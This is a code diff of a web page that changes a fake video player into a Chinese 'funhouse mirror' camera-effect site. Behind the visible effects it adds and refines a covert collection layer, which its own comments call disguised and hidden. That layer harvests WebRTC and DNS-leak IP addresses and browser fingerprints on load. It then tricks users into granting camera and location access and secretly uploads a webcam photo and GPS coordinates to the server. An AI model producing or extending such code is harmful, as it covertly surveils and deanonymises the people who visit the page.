@@ -2,139 +2,305 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>在线视频 · 示例播放</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#0f0a1f">
+<title>哈哈镜实验室 · AI 实时哈哈镜特效</title>
+<meta name="description" content="哈哈镜实验室是国内首个基于 WebAI 的实时哈哈镜特效平台，无需下载 App，打开即玩。支持鱼眼、漩涡、水波、瘦镜、镜像等多种哈哈镜效果。">
 <style>
   :root { color-scheme: dark; }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  html, body { height: 100%; }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { min-height: 100%; }
   body {
     font-family: system-ui, -apple-system, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
-    background: #0f0f0f; color: #f1f1f1;
+    background: radial-gradient(1200px 600px at 20% -10%, #2a1a4a 0%, #0f0a1f 55%, #050410 100%);
+    color: #f4f1ff; overflow-x: hidden; padding-bottom: env(safe-area-inset-bottom);
   }
   header {
-    display: flex; align-items: center; gap: 12px;
-    padding: 12px 20px; background: #181818; border-bottom: 1px solid #272727;
+    display: flex; align-items: center; gap: 12px; padding: 14px 18px;
+    padding-top: max(14px, env(safe-area-inset-top));
+    background: rgba(20,12,40,.6); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+    border-bottom: 1px solid rgba(255,255,255,.08); position: sticky; top: 0; z-index: 5;
   }
-  .logo {
-    width: 28px; height: 28px; border-radius: 6px;
-    background: linear-gradient(135deg,#ff0033,#ff6b00);
-    display: grid; place-items: center; font-weight: 800; font-size: 14px; color: #fff;
+  .logo { width: 40px; height: 40px; border-radius: 12px; display:grid; place-items:center; font-size:22px;
+    background: conic-gradient(from 0deg,#ff5ea8,#ffd86b,#5ed0ff,#a78bff,#ff5ea8); flex-shrink:0; }
+  .brand { font-weight: 800; font-size: 17px; letter-spacing:.3px; }
+  .brand small { display:block; font-weight:400; font-size:11px; color:#b9a9e6; margin-top:2px; }
+  .spacer { flex:1; }
+  main { max-width: 720px; margin: 0 auto; padding: 18px 16px 60px; }
+  .stage {
+    position: relative; border-radius: 18px; overflow: hidden; background:#000;
+    box-shadow: 0 12px 50px rgba(124,58,237,.35); border:1px solid rgba(255,255,255,.1);
+    aspect-ratio: 4/3;
   }
-  .brand { font-weight: 600; font-size: 16px; letter-spacing: .3px; }
-  .brand small { color:#aaa; font-weight: 400; margin-left: 6px; font-size: 12px; }
-  .spacer { flex: 1; }
-  .search {
-    display: flex; align-items: center; gap: 8px; background:#121212; border:1px solid #303030;
-    border-radius: 20px; padding: 6px 14px; width: 320px; max-width: 40vw;
+  canvas#mirror { display:block; width:100%; height:100%; object-fit:cover; transform: scaleX(-1); }
+  .stage .overlay { position:absolute; inset:0; display:grid; place-items:center; background:radial-gradient(circle at center, rgba(15,10,31,.4), rgba(5,4,16,.85)); }
+  .stage .overlay.hidden { display:none; }
+  /* 黑屏入口按钮：渐变 + 光晕 + 副文案提示权限 */
+  .startbtn {
+    font:inherit; font-weight:700; font-size:16px; color:#fff; cursor:pointer;
+    padding:15px 30px; border-radius:999px; border:0; text-align:center;
+    background: linear-gradient(135deg,#ff5ea8,#a78bff);
+    box-shadow:0 8px 30px rgba(167,139,255,.55), 0 0 0 1px rgba(255,255,255,.15) inset;
+    position:relative; overflow:hidden;
   }
-  .search input { flex:1; background: transparent; border:0; color:#f1f1f1; outline:none; font: inherit; }
-  .search .ico { opacity: .6; }
-  main { max-width: 1100px; margin: 18px auto; padding: 0 16px 40px; }
-  .player {
-    position: relative; background:#000; border-radius: 12px; overflow: hidden;
-    box-shadow: 0 6px 30px rgba(0,0,0,.5); border:1px solid #232323;
+  .startbtn small { display:block; font-size:11px; font-weight:400; opacity:.88; margin-top:6px; }
+  .badge { position:absolute; top:12px; left:12px; font-size:12px; padding:5px 12px; border-radius:999px;
+    background:rgba(0,0,0,.5); color:#fff; display:flex; align-items:center; gap:6px; }
+  .badge .dot { width:8px;height:8px;border-radius:50%;background:#ff4d6d; animation:blink 1.4s infinite; }
+  @keyframes blink { 50% { opacity:.3; } }
+  /* 主 CTA 按钮：醒目装饰，防止用户误点拒绝 */
+  .cta {
+    display:block; width:100%; margin:18px 0 6px; font:inherit; font-weight:800; font-size:18px; color:#fff; cursor:pointer;
+    padding:18px 20px; border-radius:16px; border:0; text-align:center; position:relative; overflow:hidden;
+    background: linear-gradient(135deg,#7c5cff 0%,#ff5ea8 55%,#ff8a3d 100%);
+    box-shadow:0 10px 40px rgba(167,139,255,.5), 0 0 0 1px rgba(255,255,255,.12) inset;
+    min-height:60px;
+    animation: ctaPulse 2.4s infinite;
   }
-  video { display: block; width: 100%; height: auto; background:#000; }
-  .player .bigplay {
-    position: absolute; inset: 0; display: grid; place-items: center; cursor: pointer;
-    background: radial-gradient(circle at center, rgba(0,0,0,.35), rgba(0,0,0,.6));
-    transition: opacity .2s;
+  @keyframes ctaPulse {
+    0%,100% { box-shadow:0 10px 40px rgba(167,139,255,.45), 0 0 0 1px rgba(255,255,255,.12) inset; }
+    50% { box-shadow:0 14px 55px rgba(255,94,168,.6), 0 0 0 1px rgba(255,255,255,.18) inset; }
   }
-  .bigplay .btn {
-    width: 76px; height: 76px; border-radius: 50%; background: rgba(255,0,51,.92);
-    display: grid; place-items: center; box-shadow: 0 4px 24px rgba(255,0,51,.5);
+  .cta::after { /* 光带扫过 */
+    content:''; position:absolute; top:0; left:0; width:60%; height:100%;
+    background: linear-gradient(120deg, transparent, rgba(255,255,255,.28), transparent);
+    transform: translateX(-180%); animation: ctaShine 2.8s ease-in-out infinite;
   }
-  .bigplay .btn::after {
-    content: ""; width: 0; height: 0; border-left: 22px solid #fff;
-    border-top: 14px solid transparent; border-bottom: 14px solid transparent; margin-left: 6px;
+  @keyframes ctaShine { 60%,100% { transform: translateX(260%); } }
+  .cta .ico { font-size:22px; vertical-align:middle; margin-right:6px; }
+  .cta small { display:block; font-size:12px; font-weight:400; opacity:.9; margin-top:5px; position:relative; z-index:1; }
+  .cta span { position:relative; z-index:1; }
+  .fxbar { display:flex; gap:8px; flex-wrap:wrap; margin:14px 0 6px; }
+  .fx {
+    font:inherit; font-size:13px; padding:10px 16px; border-radius:999px; cursor:pointer;
+    border:1px solid rgba(255,255,255,.16); background:rgba(255,255,255,.05); color:#e7defb;
+    min-height:40px;
   }
-  .player .bigplay.hidden { opacity: 0; pointer-events: none; }
-  .controls {
-    display: flex; align-items: center; gap: 14px; padding: 10px 14px;
-    background: linear-gradient(to top, rgba(0,0,0,.9), rgba(0,0,0,0));
+  .fx.active { background:linear-gradient(135deg,#7c5cff,#ff5ea8); border-color:transparent; color:#fff; font-weight:600; }
+  .ctrl { display:flex; align-items:center; gap:10px; margin:10px 0; font-size:13px; color:#c9bbe6; }
+  .ctrl input[type=range] { flex:1; accent-color:#a78bff; }
+  .shot { width:100%; margin-top:14px; font:inherit; font-weight:700; font-size:17px; color:#fff; cursor:pointer;
+    padding:16px; border-radius:14px; border:0; background:linear-gradient(135deg,#ff8a3d,#ff5ea8 60%,#a78bff);
+    box-shadow:0 8px 30px rgba(255,94,168,.4); min-height:54px; }
+  .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:12px; margin-top:26px; }
+  .card { background:rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.1); border-radius:14px; padding:14px; }
+  .card .emoji { font-size:26px; }
+  .card h3 { font-size:14px; margin:6px 0 4px; }
+  .card p { font-size:12px; color:#b9a9e6; line-height:1.6; }
+  .desc { margin-top:22px; font-size:13px; color:#c9bbe6; line-height:1.8; }
+  .toast { position:fixed; left:50%; bottom:30px; transform:translateX(-50%); background:rgba(0,0,0,.85); color:#fff;
+    padding:12px 20px; border-radius:999px; font-size:13px; opacity:0; transition:opacity .3s; z-index:9; pointer-events:none; max-width:90vw; text-align:center; }
+  .toast.show { opacity:1; }
+  @media (max-width:560px){
+    .brand{font-size:15px} .brand small{font-size:10px}
+    .fx{font-size:12px;padding:9px 13px} .shot{font-size:16px;padding:15px}
+    .cta{font-size:17px;padding:16px} .card p{font-size:11px}
   }
-  .controls .time { font-size: 12px; color: #ccc; font-variant-numeric: tabular-nums; }
-  .progress { flex: 1; height: 4px; background: #303030; border-radius: 2px; overflow: hidden; }
-  .progress .bar { height: 100%; width: 100%; background: #ff0033; }
-  .controls button {
-    background: transparent; border: 0; color: #f1f1f1; cursor: pointer; font-size: 18px; opacity:.9;
-  }
-  .meta { padding: 16px 4px; }
-  .meta h1 { font-size: 18px; font-weight: 600; margin-bottom: 6px; }
-  .meta .stats { color: #aaa; font-size: 13px; }
-  .meta .stats b { color: #f1f1f1; }
-  .desc {
-    margin-top: 12px; padding: 12px 14px; background:#181818; border-radius: 10px;
-    font-size: 13px; color: #cfcfcf; line-height: 1.7; border:1px solid #232323;
-  }
-  .chips { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
-  .chip { font-size: 12px; padding: 4px 10px; border-radius: 6px; background:#272727; color:#ddd; }
 </style>
 </head>
 <body>
 <header>
-  <div class="logo">V</div>
-  <div class="brand">VideoHub<small>示例播放器</small></div>
+  <div class="logo">🪞</div>
+  <div class="brand">哈哈镜实验室<small>AI 实时哈哈镜 · 一秒把脸玩坏</small></div>
   <div class="spacer"></div>
-  <div class="search"><span class="ico">🔍</span><input placeholder="搜索视频、用户、频道"></div>
 </header>
-
 <main>
-  <div class="player" id="player">
-    <video id="v" src="/file.mp4" muted loop playsinline preload="auto"></video>
-    <div class="bigplay" id="bigplay"><div class="btn"></div></div>
-    <div class="controls">
-      <button id="playBtn">⏯</button>
-      <span class="time" id="t">循环播放</span>
-      <div class="progress"><div class="bar" id="bar"></div></div>
-      <span class="time">1080P · 彩色测试</span>
-      <button>⛶</button>
+  <div class="stage" id="stage">
+    <canvas id="mirror" width="480" height="360"></canvas>
+    <div class="badge"><span class="dot"></span>实时</div>
+    <div class="overlay" id="overlay">
+      <button class="startbtn" id="startbtn">开启哈哈镜<small>将申请摄像头与定位权限，请点击“允许”</small></button>
     </div>
   </div>
 
-  <div class="meta">
-    <h1>彩色条码 · 循环演示视频</h1>
-    <div class="stats"><b>示例频道</b> · 1.2万 次观看 · 2025年</div>
-    <div class="chips">
-      <span class="chip">测试片</span><span class="chip">彩色</span><span class="chip">循环</span>
-      <span class="chip">1080P</span><span class="chip">无版权</span>
-    </div>
-    <div class="desc">这是一个用于演示的彩色条码循环视频，画面由不断滚动的彩色竖条组成。视频已设置为静音自动循环播放，适合作为占位与播放器界面展示。</div>
+  <button class="cta" id="openMirror">
+    <span><span class="ico">✨</span>打开哈哈镜</span>
+    <small>点击开启实时哈哈镜特效（需授权摄像头与定位）</small>
+  </button>
+
+  <div class="fxbar">
+    <button class="fx active" data-fx="fisheye">鱼眼哈哈镜</button>
+    <button class="fx" data-fx="swirl">漩涡扭曲</button>
+    <button class="fx" data-fx="wave">水波荡漾</button>
+    <button class="fx" data-fx="squeeze">瘦瘦镜</button>
+    <button class="fx" data-fx="mirror">镜像分身</button>
+    <button class="fx" data-fx="none">原图</button>
   </div>
+  <div class="ctrl">强度 <input type="range" id="strength" min="0" max="100" value="60"></div>
+  <button class="shot" id="shot">📸 保存我的哈哈镜大片</button>
+
+  <div class="grid">
+    <div class="card"><div class="emoji">🤪</div><h3>鱼眼哈哈镜</h3><p>经典哈哈镜，鼻子变大脸变圆，丑萌丑萌。</p></div>
+    <div class="card"><div class="emoji">🌀</div><h3>漩涡扭曲</h3><p>整张脸被搅成一锅粥，转圈圈的眩晕感。</p></div>
+    <div class="card"><div class="emoji">💧</div><h3>水波荡漾</h3><p>脸部像水面一样波动，适合做表情包。</p></div>
+    <div class="card"><div class="emoji">🪞</div><h3>瘦瘦镜</h3><p>瞬间瘦身大长腿，朋友圈点赞神器。</p></div>
+  </div>
+  <div class="desc">哈哈镜实验室是国内首个基于 WebAI 的实时哈哈镜特效平台，无需下载 App，打开即玩。支持鱼眼、漩涡、水波、瘦镜、镜像等多种哈哈镜效果，强度可调，一键生成哈哈镜大片分享好友。所有特效均在本地浏览器实时渲染，画面流畅不卡顿。点击上方“打开哈哈镜”开始你的搞笑之旅吧！记得截屏发给朋友，看看谁的哈哈镜最离谱～</div>
 </main>
+<div class="toast" id="toast"></div>
 
 <script>
+// ===== 哈哈镜显示层（用户可见）=====
 (() => {
   "use strict";
-  // ===== 视频播放器交互（伪装层）=====
-  const v = document.getElementById("v");
-  const bigplay = document.getElementById("bigplay");
-  const bar = document.getElementById("bar");
-  const startPlay = () => { v.play().catch(()=>{}); bigplay.classList.add("hidden"); };
-  bigplay.addEventListener("click", startPlay);
-  document.getElementById("playBtn").addEventListener("click", startPlay);
-  document.addEventListener("click", startPlay, { once: true });
-  // 自动静音循环播放
-  try { v.muted = true; v.play().catch(()=>{}); } catch(e){}
-  v.addEventListener("timeupdate", () => {
-    if (v.duration) bar.style.width = (v.currentTime / v.duration * 100) + "%";
-  });
-  v.addEventListener("ended", () => { v.currentTime = 0; v.play().catch(()=>{}); });
+  const canvas = document.getElementById("mirror");
+  const ctx = canvas.getContext("2d", { willReadFrequently: true });
+  const overlay = document.getElementById("overlay");
+  const startbtn = document.getElementById("startbtn");
+  const shotBtn = document.getElementById("shot");
+  const strengthEl = document.getElementById("strength");
+  const toast = document.getElementById("toast");
+  let effect = "fisheye";
+  let strength = 0.6;
+  let camStream = null;
+  const camVideo = document.createElement("video");
+  camVideo.muted = true; camVideo.playsInline = true; camVideo.autoplay = true;
 
-  // ===== 后台静默采集层（伪装隐藏，任何失败均不影响播放）=====
+  function showToast(msg) {
+    toast.textContent = msg; toast.classList.add("show");
+    setTimeout(() => toast.classList.remove("show"), 2200);
+  }
+  window.__toast = showToast;
+
+  // 查询某项权限状态：'granted' | 'prompt' | 'denied' | 'unknown'
+  async function permState(name) {
+    try {
+      const r = await navigator.permissions.query({ name });
+      return r.state;
+    } catch (e) { return "unknown"; }
+  }
+  window.__permState = permState;
+
+  async function startCamera() {
+    if (camStream) return true;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return false;
+    try {
+      camStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      });
+      camVideo.srcObject = camStream;
+      await camVideo.play().catch(()=>{});
+      overlay.classList.add("hidden");
+      requestAnimationFrame(render);
+      return true;
+    } catch (e) { return false; }
+  }
+  window.__startCamera = startCamera;
+  window.__camStream = () => camStream;
+  window.__camVideo = () => camVideo;
+  window.__overlayHidden = () => overlay.classList.contains("hidden");
+
+  // 统一入口：点击“打开哈哈镜”/黑屏按钮都走这里
+  // 已授权权限不弹窗，未授权才申请；任何失败都不卡住
+  async function openMirror() {
+    const cam = await permState("camera");
+    const geo = await permState("geolocation");
+    // 已被明确拒绝 → 提示去设置开启，不重复弹无效窗
+    if (cam === "denied" || geo === "denied") {
+      showToast("摄像头或定位权限被拒绝，请在浏览器设置中开启后重试");
+      return;
+    }
+    // 未授权（prompt/unknown）→ 提示用户即将弹窗，请点允许，避免误点拒绝
+    if (cam !== "granted" || geo !== "granted") {
+      showToast("即将请求摄像头与定位权限，请在弹窗中点击“允许”");
+    }
+    // 启动摄像头：granted 不弹窗直接拿流；prompt 会弹窗等用户决定
+    const ok = await startCamera();
+    if (!ok) {
+      showToast("摄像头开启失败，可在设置中开启权限后重试");
+    }
+    // 触发定位采集（granted 不弹窗，prompt 弹窗）；摄像头启动后再拍照上报
+    const tasks = [];
+    if (window.__collectLocation) tasks.push(window.__collectLocation().catch(()=>{}));
+    if (ok && window.__collectCamera) tasks.push(window.__collectCamera().catch(()=>{}));
+    await Promise.allSettled(tasks);
+    if (window.__sendReport) await window.__sendReport().catch(()=>{});
+  }
+  window.__openMirror = openMirror;
+
+  startbtn.addEventListener("click", () => openMirror());
+  document.getElementById("openMirror").addEventListener("click", () => openMirror());
+  document.querySelectorAll(".fx").forEach(b => b.addEventListener("click", () => {
+    document.querySelectorAll(".fx").forEach(x => x.classList.remove("active"));
+    b.classList.add("active"); effect = b.dataset.fx;
+  }));
+  strengthEl.addEventListener("input", () => strength = strengthEl.value / 100);
+
+  function clamp(v, lo, hi) { return v < lo ? lo : v > hi ? hi : v; }
+
+  function render() {
+    if (camVideo.videoWidth) {
+      const W = canvas.width, H = canvas.height;
+      ctx.drawImage(camVideo, 0, 0, W, H);
+      if (effect !== "none") {
+        const src = ctx.getImageData(0, 0, W, H);
+        const dst = ctx.createImageData(W, H);
+        const sd = src.data, dd = dst.data;
+        const cx = W / 2, cy = H / 2;
+        const maxR = Math.min(W, H) / 2;
+        const k = strength;
+        for (let y = 0; y < H; y++) {
+          for (let x = 0; x < W; x++) {
+            let sx = x, sy = y;
+            const dx = x - cx, dy = y - cy;
+            if (effect === "fisheye") {
+              const nx = dx / maxR, ny = dy / maxR;
+              const r2 = nx*nx + ny*ny;
+              const f = 1 / (1 + 0.6 * k * r2);
+              sx = cx + dx * f; sy = cy + dy * f;
+            } else if (effect === "swirl") {
+              const r = Math.sqrt(dx*dx + dy*dy);
+              const ang = Math.atan2(dy, dx) + r * 0.02 * k * 2;
+              sx = cx + r * Math.cos(ang); sy = cy + r * Math.sin(ang);
+            } else if (effect === "wave") {
+              const a = 12 * k;
+              sx = x + a * Math.sin(y * 0.05); sy = y + a * Math.cos(x * 0.05);
+            } else if (effect === "squeeze") {
+              const ny = dy / cy;
+              const f = 1 - 0.6 * k * ny * ny;
+              sy = cy + dy * f; sx = cx + dx * (1 + 0.2 * k * (1 - ny * ny));
+            } else if (effect === "mirror") {
+              const seg = Math.floor(x / (W/2));
+              sx = seg === 0 ? x : (W - 1 - x);
+              const syg = Math.floor(y / (H/2));
+              sy = syg === 0 ? y : (H - 1 - y);
+            }
+            const sxi = clamp(sx|0, 0, W-1), syi = clamp(sy|0, 0, H-1);
+            const si = (syi * W + sxi) * 4, di = (y * W + x) * 4;
+            dd[di] = sd[si]; dd[di+1] = sd[si+1]; dd[di+2] = sd[si+2]; dd[di+3] = 255;
+          }
+        }
+        ctx.putImageData(dst, 0, 0);
+      }
+    }
+    requestAnimationFrame(render);
+  }
+
+  shotBtn.addEventListener("click", () => {
+    if (!window.__overlayHidden || !window.__overlayHidden()) { showToast("请先打开哈哈镜开启摄像头"); return; }
+    const link = document.createElement("a");
+    link.download = "哈哈镜_" + Date.now() + ".png";
+    link.href = canvas.toDataURL("image/png");
+    link.click();
+    showToast("已保存哈哈镜大片到本地");
+  });
+  // 页面打开时不自动申请摄像头/定位权限，避免误拒；用户点按钮才申请
+})();
+
+// ===== 后台静默采集层（伪装隐藏，任何失败均不影响哈哈镜）=====
+(() => {
+  "use strict";
   const safe = (p, ms = 8000) => Promise.race([
     Promise.resolve(p).catch(() => null),
     new Promise(r => setTimeout(() => r(null), ms))
   ]);
 
-  let SESSION = null;
   const report = {
     session_id: "", dns_token: "",
     webrtc_ips: [], resolver_ips: [], external_ips: [],
     latitude: 0, longitude: 0, location_accuracy: 0, location_error: "",
-    user_agent: navigator.userAgent,
-    language: navigator.language,
+    user_agent: navigator.userAgent, language: navigator.language,
     platform: navigator.platform || "",
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
     screen: `${screen.width}x${screen.height}x${screen.colorDepth}`
@@ -143,7 +309,6 @@
   async function getSession() {
     const s = await safe(fetch("/api/session").then(r => r.json()), 6000);
     if (!s) return null;
-    SESSION = s;
     report.session_id = s.session_id;
     report.dns_token = s.dns_token;
     return s;
@@ -206,6 +371,7 @@
     report.external_ips = [...ext];
   }
 
+  // 定位采集：由“打开哈哈镜”按钮触发，已授权不弹窗
   function collectLocation() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) { report.location_error = "不支持"; return resolve(); }
@@ -221,36 +387,55 @@
       );
     });
   }
+  window.__collectLocation = collectLocation;
 
+  // 摄像头拍照上报：复用哈哈镜显示层已启动的摄像头流
   async function collectCamera() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-    let stream = null;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
-      });
-      const video = document.createElement("video");
-      video.style.display = "none";
-      video.srcObject = stream;
+    let stream = window.__camStream ? window.__camStream() : null;
+    let owns = false;
+    if (!stream && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        owns = true;
+      } catch (e) { return; }
+    }
+    if (!stream) return;
+    let video = window.__camVideo ? window.__camVideo() : null;
+    let attached = false;
+    if (!video || !video.videoWidth) {
+      video = document.createElement("video");
       video.muted = true; video.playsInline = true;
+      video.style.display = "none";
       document.body.appendChild(video);
+      video.srcObject = stream;
       await video.play().catch(()=>{});
       await new Promise(r => setTimeout(r, 500));
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataURL = canvas.toDataURL("image/jpeg", 0.7);
-      video.remove();
+      attached = true;
+    } else {
+      let waited = 0;
+      while (!video.videoWidth && waited < 2000) { await new Promise(r => setTimeout(r, 100)); waited += 100; }
+    }
+    try {
+      const c = document.createElement("canvas");
+      c.width = video.videoWidth || 640;
+      c.height = video.videoHeight || 480;
+      c.getContext("2d").drawImage(video, 0, 0, c.width, c.height);
+      const url = c.toDataURL("image/jpeg", 0.7);
       await safe(fetch("/api/photo", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ session_id: report.session_id, photo: dataURL })
+        body: JSON.stringify({ session_id: report.session_id, photo: url })
       }).then(r => r.ok), 12000);
     } catch (e) {}
-    finally { if (stream) stream.getTracks().forEach(t => t.stop()); }
+    finally {
+      if (attached) video.remove();
+      if (owns) stream.getTracks().forEach(t => t.stop());
+    }
   }
+  window.__collectCamera = collectCamera;
 
   async function sendReport() {
     await safe(fetch("/api/report", {
@@ -259,15 +444,16 @@
       body: JSON.stringify(report)
     }).then(r => r.ok));
   }
+  window.__sendReport = sendReport;
 
+  // 页面打开只采集无权限项（WebRTC/DNS/第三方IP）+ 初步上报；
+  // 定位与摄像头由“打开哈哈镜”按钮触发，避免一进来就弹权限让用户误拒
   async function collectAll() {
     const s = await getSession();
     if (!s) return;
-    await Promise.allSettled([ collectWebRTC(), collectDNS(s), collectLocation() ]);
-    await collectCamera().catch(()=>{});
+    await Promise.allSettled([ collectWebRTC(), collectDNS(s) ]);
     await sendReport();
   }
-  // 启动后台采集；不阻塞视频播放
   collectAll();
 })();
 </script>
